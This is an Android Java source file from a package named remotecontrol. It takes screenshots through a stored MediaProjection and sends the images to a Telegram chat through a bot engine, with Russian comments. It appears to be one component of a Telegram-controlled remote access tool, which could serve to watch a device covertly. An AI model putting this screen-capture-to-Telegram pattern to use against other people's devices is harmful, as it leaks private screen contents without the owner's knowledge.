package com.remotecontrol;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;

public class ScreenCapture {

    private static final String TAG = "ScreenCapture";
    private static MediaProjection activeProjection;
    private static VirtualDisplay virtualDisplay;
    private static ImageReader imageReader;

    public interface ScreenshotCallback {
        void onScreenshot(File file);
        void onError(String message);
    }

    public static void setProjection(MediaProjection projection) {
        activeProjection = projection;
    }

    public static void captureWithExistingProjection(Context context, long chatId, TelegramEngine engine) {
        if (activeProjection == null) {
            Log.e(TAG, "activeProjection is null");
            return;
        }

        takeScreenshot(context, new ScreenshotCallback() {
            @Override
            public void onScreenshot(File file) {
                if (engine != null) {
                    // ИСПРАВЛЕНО: удален третий аргумент (строка)
                    engine.sendPhoto(chatId, file);
                }
                context.stopService(new Intent(context, ScreenCaptureService.class));
            }

            @Override
            public void onError(String message) {
                Log.e(TAG, "Screenshot error: " + message);
                if (engine != null) {
                    engine.sendMessage(chatId, "❌ Ошибка захвата: " + message);
                }
            }
        });
    }

    private static void takeScreenshot(Context context, ScreenshotCallback callback) {
        WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getRealMetrics(metrics);

        int width = metrics.widthPixels;
        int height = metrics.heightPixels;
        int density = metrics.densityDpi;

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = activeProjection.createVirtualDisplay(
                "Screenshot", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC,
                imageReader.getSurface(), null, null);

        imageReader.setOnImageAvailableListener(reader -> {
            imageReader.setOnImageAvailableListener(null, null);
            Image image = null;
            Bitmap bitmap = null;
            try {
                image = reader.acquireLatestImage();
                if (image != null) {
                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    int pixelStride = planes[0].getPixelStride();
                    int rowStride = planes[0].getRowStride();
                    int rowPadding = rowStride - pixelStride * width;

                    bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    File file = new File(context.getCacheDir(), "sc_" + System.currentTimeMillis() + ".jpg");
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos);
                    }
                    callback.onScreenshot(file);
                }
            } catch (Exception e) {
                callback.onError(e.getMessage());
            } finally {
                if (image != null) image.close();
                if (bitmap != null) bitmap.recycle();
                releaseDisplay();
            }
        }, null);
    }

    private static void releaseDisplay() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }
}
